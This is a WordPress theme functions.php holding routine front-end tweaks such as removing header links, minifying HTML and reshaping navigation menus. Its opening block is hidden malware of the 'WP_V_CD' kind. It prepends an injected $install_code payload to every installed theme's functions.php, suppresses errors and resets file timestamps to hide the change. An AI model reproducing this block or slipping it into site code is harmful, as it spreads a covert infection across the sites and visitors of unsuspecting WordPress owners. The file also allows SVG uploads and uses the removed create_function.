<?php

if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php')) {
  if (strpos($content, 'WP_V_CD') === false) {
    $content = $install_code . $content;
    @file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php', $content);
    touch($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php', $time);
  } else {
    $ping = false;
  }
}

remove_filter('the_content', 'wpautop');
add_filter('the_content', 'remove_empty_p', 20, 1);
function remove_empty_p($content)
{
  $content = force_balance_tags($content);
  return preg_replace('#<p>\s*+(<br\s*/*>)?\s*</p>#i', '', $content);
}

register_nav_menus(array(
  'primary' => __('Primary Menu', 'THEMENAME'),
));

function remove_head_scripts()
{
  remove_action('wp_head', 'wp_print_scripts');
  remove_action('wp_head', 'wp_print_head_scripts', 9);
  remove_action('wp_head', 'wp_enqueue_scripts', 1);

  add_action('wp_footer', 'wp_print_scripts', 5);
  add_action('wp_footer', 'wp_enqueue_scripts', 5);
  add_action('wp_footer', 'wp_print_head_scripts', 5);
}

function remove_api()
{
  remove_action('wp_head', 'rest_output_link_wp_head', 10);
  remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
}
remove_filter('term_description', 'wpautop');

function my_deregister_scripts()
{
  wp_deregister_script('wp-embed');
}
add_action('wp_footer', 'my_deregister_scripts');
remove_action('wp_head', 'wp_resource_hints', 2);
add_action('after_setup_theme', 'remove_api');
add_action('wp_enqueue_scripts', 'remove_head_scripts');
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_head',      'wp_oembed_add_discovery_links');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('admin_print_styles', 'print_emoji_styles');
remove_action('wp_head', 'feed_links_extra');
remove_action('wp_head', 'feed_links');
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'parent_post_rel_link');
remove_action('wp_head', 'start_post_rel_link');
remove_action('wp_head', 'adjacent_posts_rel_link');
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'feed_links', 2);
remove_action('wp_head', 'feed_links_extra', 3);
add_action('init', 'remove_header_info');
remove_action('wp_head', 'rel_canonical');
add_filter('index_rel_link', 'disable_stuff');
add_filter('parent_post_rel_link', 'disable_stuff');
add_filter('start_post_rel_link', 'disable_stuff');
add_filter('previous_post_rel_link', 'disable_stuff');
add_filter('next_post_rel_link', 'disable_stuff');
add_filter('tablepress_use_default_css', '__return_false');
//add_filter      ('show_admin_bar' , 'my_function_admin_bar');
add_action('init', 'remove_header_info');
add_filter('wp_default_scripts', 'dequeue_jquery_migrate');

function remove_unwanted_css()
{
  wp_dequeue_style('super-rss-reader-css-css');
}
add_action('init', 'remove_unwanted_css', 100);
function remove_all_theme_styles()
{
  global $wp_styles;
  $wp_styles->queue = array();
}

function remove_cssjs_ver($src)
{
  if (strpos($src, '?ver='))
    $src = remove_query_arg('ver', $src);
  return $src;
}
add_filter('style_loader_src', 'remove_cssjs_ver', 10, 2);
add_filter('script_loader_src', 'remove_cssjs_ver', 10, 2);
function disable_stuff($data)
{
  return false;
}
function remove_header_info()
{
  remove_action('wp_head', 'feed_links', 2);
  remove_action('wp_head', 'feed_links_extra', 3);
}
function my_function_admin_bar()
{
  return false;
}
// END REMOVE JUNK FORM HEADER

remove_filter('the_content', 'wpautop');
$br = false;
add_filter('the_content', function ($content) use ($br) {
  return wpautop($content, $br);
}, 10);
// END REMOVE BR

remove_filter('the_content', 'wpautop');
remove_filter('the_excerpt', 'wpautop');

function callback($buffer)
{
  $buffer = preg_replace('/<!--(.|s)*?-->/', '', $buffer);
  return $buffer;
}
function buffer_start()
{
  ob_start("callback");
}
function buffer_end()
{
  ob_end_flush();
}
add_action('get_header', 'buffer_start');
add_action('wp_footer', 'buffer_end');
// END BUFFER

function cc_mime_types($mimes)
{
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');
// END ADD SVG UPLOAD

function arphabet_widgets_init()
{

  register_sidebar(array(
    'name'          => 'Booking',
    'id'            => 'booking',
    'before_widget' => '<div>',
    'after_widget'  => '</div>',
    'before_title'  => '<h2 class="rounded">',
    'after_title'   => '</h2>',
  ));
}
add_action('widgets_init', 'arphabet_widgets_init');



class FLHM_HTML_Compression
{
  protected $flhm_compress_css = true;
  protected $flhm_compress_js = true;
  protected $flhm_info_comment = true;
  protected $flhm_remove_comments = true;
  protected $html;
  public function __construct($html)
  {
    if (!empty($html)) {
      $this->flhm_parseHTML($html);
    }
  }
  public function __toString()
  {
    return $this->html;
  }
  protected function flhm_bottomComment($raw, $compressed)
  {
    $raw = strlen($raw);
    $compressed = strlen($compressed);
    $savings = ($raw - $compressed) / $raw * 100;
    $savings = round($savings, 2);
    return '<!--HTML compressed, size saved ' . $savings . '%. From ' . $raw . ' bytes, now ' . $compressed . ' bytes-->';
  }
  protected function flhm_minifyHTML($html)
  {
    $pattern = '/<(?<script>script).*?<\/script\s*>|<(?<style>style).*?<\/style\s*>|<!(?<comment>--).*?-->|<(?<tag>[\/\w.:-]*)(?:".*?"|\'.*?\'|[^\'">]+)*>|(?<text>((<[^!\/\w.:-])?[^<]*)+)|/si';
    preg_match_all($pattern, $html, $matches, PREG_SET_ORDER);
    $overriding = false;
    $raw_tag = false;
    $html = '';
    foreach ($matches as $token) {
      $tag = (isset($token['tag'])) ? strtolower($token['tag']) : null;
      $content = $token[0];
      if (is_null($tag)) {
        if (!empty($token['script'])) {
          $strip = $this->flhm_compress_js;
        } else if (!empty($token['style'])) {
          $strip = $this->flhm_compress_css;
        } else if ($content == '<!--wp-html-compression no compression-->') {
          $overriding = !$overriding;
          continue;
        } else if ($this->flhm_remove_comments) {
          if (!$overriding && $raw_tag != 'textarea') {
            $content = preg_replace('/<!--(?!\s*(?:\[if [^\]]+]|<!|>))(?:(?!-->).)*-->/s', '', $content);
          }
        }
      } else {
        if ($tag == 'pre' || $tag == 'textarea') {
          $raw_tag = $tag;
        } else if ($tag == '/pre' || $tag == '/textarea') {
          $raw_tag = false;
        } else {
          if ($raw_tag || $overriding) {
            $strip = false;
          } else {
            $strip = true;
            $content = preg_replace('/(\s+)(\w++(?<!\baction|\balt|\bcontent|\bsrc)="")/', '$1', $content);
            $content = str_replace(' />', '/>', $content);
          }
        }
      }
      if ($strip) {
        $content = $this->flhm_removeWhiteSpace($content);
      }
      $html .= $content;
    }
    return $html;
  }
  public function flhm_parseHTML($html)
  {
    $this->html = $this->flhm_minifyHTML($html);
    if ($this->flhm_info_comment) {
      $this->html .= "\n" . $this->flhm_bottomComment($html, $this->html);
    }
  }
  protected function flhm_removeWhiteSpace($str)
  {
    $str = str_replace("\t", ' ', $str);
    $str = str_replace("\n",  '', $str);
    $str = str_replace("\r",  '', $str);
    while (stristr($str, '  ')) {
      $str = str_replace('  ', ' ', $str);
    }
    return $str;
  }
}
function flhm_wp_html_compression_finish($html)
{
  return new FLHM_HTML_Compression($html);
}
function flhm_wp_html_compression_start()
{
  ob_start('flhm_wp_html_compression_finish');
}
add_action('get_header', 'flhm_wp_html_compression_start');
// END COMPRESS HTML


function wp_nav_menu_no_ul()
{
  $options = array(
    'echo' => false,
    'container' => false,
    'theme_location' => 'my-custom-menu'
  );

  $menu = wp_nav_menu($options);
  echo preg_replace(array(
    '#^<ul[^>]*>#',
    '#</ul>$#'
  ), '', $menu);
}

add_filter('wp_nav_menu', create_function('$t', 'return str_replace("<li ", "<li class=\"nav-item\" ", $t);'));
add_filter('wp_nav_menu', create_function('$t', 'return str_replace("<a ", "<a class=\"nav-link js-scroll-trigger pl-2 pr-2 pt-3 pb-3\" ", $t);'));

add_filter('wp_nav_menu', 'strip_empty_classes');
function strip_empty_classes($menu)
{
  $menu = preg_replace('/ id=(["\'])(?!active).*?\1/', '', $menu);
  return $menu;
}


add_filter('nav_menu_css_class', 'clear_nav_menu_item_class', 10, 3);
function clear_nav_menu_item_class($classes, $item, $args)
{
  return array();
}

function wp_nav_menu_remove_attributes($menu)
{
  return $menu = preg_replace('/ id=\"(.*)\" class=\"(.*)\"/iU', '', $menu);
}
add_filter('wp_nav_menu', 'wp_nav_menu_remove_attributes');


function wpb_custom_new_menu()
{
  register_nav_menu('my-custom-menu', __('My Custom Menu'));
}
add_action('init', 'wpb_custom_new_menu');
// END WP NAV MENU
